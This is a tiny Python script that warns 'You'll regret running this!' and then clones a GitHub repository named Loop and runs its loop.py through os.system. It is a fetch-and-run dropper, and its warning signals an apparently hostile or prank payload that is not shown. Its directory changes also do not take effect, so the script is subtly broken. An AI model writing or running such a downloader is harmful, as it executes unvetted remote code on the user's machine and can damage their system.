import os

print("You'll regret running this!")
os.system('mkdir round')
os.system('cd round')
os.system('''git clone https://github.com/xattsec/Loop.git round''')
os.system('cd Loop')
os.system('python3 loop.py')
